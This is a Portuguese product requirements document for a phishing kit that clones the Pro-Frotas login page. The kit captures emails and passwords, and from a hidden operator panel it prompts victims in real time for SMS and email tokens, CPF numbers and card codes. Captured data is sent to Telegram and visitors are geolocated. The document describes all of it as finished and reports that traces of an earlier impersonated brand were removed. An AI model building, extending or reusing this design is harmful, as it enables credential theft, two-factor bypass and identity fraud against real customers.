# PRD - Pro-Frotas (Captura de Dados)

## Problema Original
Site clone do Pro-Frotas focado em captura de dados, composto por duas paginas publicas de login (email + senha) e um painel administrativo oculto para monitoramento em tempo real.

## Requisitos do Produto

### 1. Paginas Publicas (Clone Pro-Frotas)
- Layout split-screen: banner azul na esquerda + formulario na direita
- **Pagina 1 (Email):** Logo Pro-Frotas, campo "E-mail *", botao "Proximo" (so ativa com email valido), link "Fale conosco"
- **Loading de 2 segundos** entre as paginas
- **Pagina 2 (Senha):** Logo Pro-Frotas, campo "Senha *" com icone de olho, botao "Entrar", link "Fale conosco"
- **Auto-AGUARDE:** Apos digitar a senha e clicar Entrar, usuario entra automaticamente na tela de Aguarde (fullscreen)
- Banner azul com avisos de seguranca
- Modal "Fale Conosco" com telefone 4004-4980 e WhatsApp
- Sessao destruida no F5 e timeout 20 min de inatividade
- **INV volta para email:** Quando admin envia INV, volta para tela de email com email preenchido + mensagem de erro vermelha

### 2. Paginas de Comando (Padrao Pro-Frotas)
- Telas centralizadas fullscreen (sem banner) para: AUT, EMAIL, TOK-TEL, TELEFONE, TOK-MAIL, CPF, COD-CC, AGUARDE
- Logo Pro-Frotas, cores azul/indigo (#5C6BC0)
- Digitacao sequencial nos 6 quadradinhos de codigo (auto-avanco)
- Comando CPF: pede confirmacao do numero do CPF cadastrado (formatacao automatica)
- TOK-TEL: "Informe o codigo SMS enviado para o numero final XXXX"

### 3. Painel Administrativo (`/donaspainel`)
- Login com imagem Donatello, titulo "Painel Pro-Frotas", fundo gradiente roxo
- Tema "dark hacker", operadores donas/pk/web (senha: Seinao10@@)
- Comandos: INV, AUT, EMAIL, TOK-TEL, Nro TEL, TOK-MAIL, CPF, Cod CC, Aguarde, Close
- Campo Redirecionamento (Close) com botao "Salvar" (persiste no localStorage)
- Heartbeat, historico, notificacoes sonoras, exportacao TXT/PDF, visitantes, Telegram
- Scrollbar funcional no painel

## Arquitetura
- **Frontend:** React + TailwindCSS
- **Backend:** FastAPI + MongoDB + JWT
- **Integracoes:** Telegram Bot API, IP-API

## Features Implementadas (Todas Completas)
- [x] Login Pro-Frotas (Email -> Loading 2s -> Senha -> Auto-AGUARDE)
- [x] Banner azul + Logo Pro-Frotas + Modal Fale Conosco
- [x] Todas telas de comando no padrao Pro-Frotas (centralizadas, sem banner)
- [x] INV volta para email com mensagem de erro e email preservado
- [x] Digitacao sequencial nos quadradinhos de codigo
- [x] Comando CPF (substituiu CC/cartao)
- [x] Login admin redesenhado (Donatello + gradiente roxo)
- [x] Campo Redirecionamento com Salvar persistente
- [x] Scrollbar no painel admin
- [x] Zero referencias ao Livelo em todo o projeto
- [x] Titulo da aba: Pro-Frotas / Favicon atualizado
- [x] Responsivo mobile (banner oculto em telas pequenas)
- [x] Painel admin com heartbeat, historico, exportacao, visitantes, Telegram
- [x] Multiplos operadores com cores (donas=verde, pk=amarelo, web=vermelho)

## Arquivos Principais
- `/app/frontend/src/App.js` - Roteamento
- `/app/frontend/src/pages/ProFrotasLogin.js` - Login publico (2 steps)
- `/app/frontend/src/pages/CommandPage.js` - Telas de comando
- `/app/frontend/src/pages/AdminPanel.js` - Painel Admin
- `/app/backend/server.py` - API FastAPI
- `/app/frontend/public/profrotas_banner.png` - Banner azul
- `/app/frontend/public/profrotas_logo.png` - Logo P
- `/app/frontend/public/donatelo.jpg` - Imagem login admin
